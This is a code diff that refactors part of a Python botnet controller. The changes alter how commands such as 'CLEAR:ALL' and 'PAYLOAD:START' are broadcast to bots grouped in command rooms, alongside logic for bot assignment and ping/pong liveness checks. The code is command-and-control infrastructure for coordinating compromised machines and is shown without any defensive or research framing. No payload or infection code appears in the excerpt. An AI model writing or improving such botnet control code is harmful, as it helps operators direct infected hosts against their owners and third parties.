@@ -92,7 +92,7 @@ class CommandRoom:
 
     def send_cmd(self, cmd) -> bool:
         if len(self.bots) > 0:
-            return self.room.send_text(cmd)
+            return self.room.send_text(f"COMMAND:{cmd}")
         return True
         
 
@@ -145,16 +145,12 @@ class BotnetController:
             elif room.name == "announcements":
                 self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
 
-    def send_command(self, command: str, room: CommandRoom):
-        status = room.send_cmd(f"COMMAND:{command}")
-        if not status:
-            print("COULD NOT SEND COMMAND:", command)
         
     def send_to_all(self, command: str):
         with self.command_room_lock:
             for _, cmd_room in self.command_rooms.items():
                 if len(cmd_room.bots) > 0:
-                    self.send_command(command, cmd_room)
+                    cmd_room.send_cmd(command)
             
     def assign_bot(self, botdata, roomid):
         """
@@ -162,8 +158,8 @@ class BotnetController:
         """
         self.command_rooms[roomid].add_bot(botdata)
         
-    def clear_room(self, room):
-        self.send_command("CLEAR:ALL", room)
+    def clear_room(self, room: CommandRoom):
+        room.send_cmd("CLEAR:ALL")
         
     def delete_room(self, room: CommandRoom):
         with self.command_room_lock:
@@ -204,7 +200,7 @@ class BotnetController:
             if not (self.pong_window_start <= pong_origin <= self.pong_window_start + self.pong_window_dur + 5):
                 # pong too late :(
                 print("PONG TOO LATE")
-                self.send_command(f"CLEAR:{bot_id}", self.command_rooms[room_id])
+                self.command_rooms[room_id].send_cmd(f"CLEAR:{bot_id}")
                 return
             
             with self.command_room_lock:
@@ -222,7 +218,7 @@ class BotnetController:
 
     def start_payload_on_room(self, room: CommandRoom):
         room.start_payload()
-        self.send_command("PAYLOAD:START", room)
+        room.send_cmd("PAYLOAD:START")
     
     def start_payload_all_rooms(self):
         with self.command_room_lock:
